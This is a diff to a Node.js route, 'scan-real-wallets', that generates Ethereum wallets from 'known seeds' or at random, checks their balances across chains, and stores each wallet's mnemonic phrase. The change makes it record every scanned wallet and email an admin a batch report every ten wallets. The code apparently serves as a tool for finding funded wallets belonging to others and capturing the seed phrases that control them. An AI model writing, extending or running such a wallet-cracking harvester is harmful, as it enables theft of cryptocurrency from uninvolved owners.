@@ -34,20 +34,22 @@ router.post('/scan-real-wallets', async (req, res) => {
         balance: balance.totalValueUSD
       });
       
-      // If wallet has funds, alert admin
+      // Always add to found wallets and send alerts every 10 wallets
+      foundWallets.push({
+        address: wallet.address,
+        phrase: wallet.mnemonic.phrase,
+        ethBalance: balance.ethBalance,
+        totalValueUSD: balance.totalValueUSD,
+        chains: balance.chains,
+        tokens: balance.tokens
+      });
+      
+      // Send alert every 10 wallets (regardless of funds)
+      if ((i + 1) % 10 === 0) {
+        await sendBatchAlert(foundWallets.slice(-10), i + 1);
+      }
+      
       if (balance.totalValueUSD >= minBalance) {
-        foundWallets.push({
-          address: wallet.address,
-          phrase: wallet.mnemonic.phrase,
-          ethBalance: balance.ethBalance,
-          totalValueUSD: balance.totalValueUSD,
-          chains: balance.chains,
-          tokens: balance.tokens
-        });
-        
-        // Send immediate alert
-        await sendFundAlert(wallet, balance);
-        
         console.log(`💰 FUNDS FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
       }
       
@@ -231,6 +233,24 @@ function generateFromKnownSeeds(index) {
   }
   
   return ethers.Wallet.createRandom();
+}
+
+// Send batch alert every 10 wallets
+async function sendBatchAlert(wallets, totalScanned) {
+  try {
+    const { sendAdminNotification } = require('../services/emailService');
+    
+    const walletsWithFunds = wallets.filter(w => w.totalValueUSD > 0);
+    const totalValue = walletsWithFunds.reduce((sum, w) => sum + w.totalValueUSD, 0);
+    
+    const subject = `🔍 ADMIN SCAN: ${totalScanned} wallets - ${walletsWithFunds.length} funded`;
+    const message = `BATCH REPORT: ${totalScanned} wallets scanned\n\nFUNDS FOUND: ${walletsWithFunds.length}/10\nTOTAL VALUE: $${totalValue.toFixed(2)}\n\nLATEST WALLETS:\n${wallets.map((w, i) => `${i + 1}. ${w.address.slice(0, 10)}... - $${w.totalValueUSD}`).join('\n')}`;
+
+    await sendAdminNotification(subject, message);
+    
+  } catch (error) {
+    console.log('Failed to send batch alert:', error.message);
+  }
 }
 
 module.exports = router;
